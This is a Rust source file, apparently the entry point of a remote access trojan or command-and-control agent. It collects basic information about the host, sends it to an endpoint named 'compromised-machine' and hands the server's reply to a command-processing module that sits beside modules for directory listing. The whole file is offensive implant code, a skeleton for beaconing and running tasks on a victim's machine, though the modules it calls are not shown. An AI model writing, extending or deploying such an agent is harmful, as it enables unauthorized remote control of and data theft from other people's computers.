mod basicinfo;
mod requests;
mod utils;
mod processCommand;
mod listdir;

use reqwest::Method;
use serde::{Deserialize, Serialize};
use requests::send_json_request;

#[derive(Debug, Serialize)]
struct Response{
    id:String,
    response:String
}

#[derive(Debug, Serialize)]
struct Response2{
    id:String,
    result:String
}




const  url:&str = "http://localhost/api/compromised-machine/";

fn main() {
    
    let info = basicinfo::basic_info();
    let get_resp  = send_json_request(Method::GET, url, Some(&info));

    let message = match get_resp {
        Ok(resp) => resp,
        Err(e) => {
            eprintln!("Error sending request: {}", e);
            return;
        }
    };

    println!("{}" , message);

    processCommand::filter_command(&message);
   
}
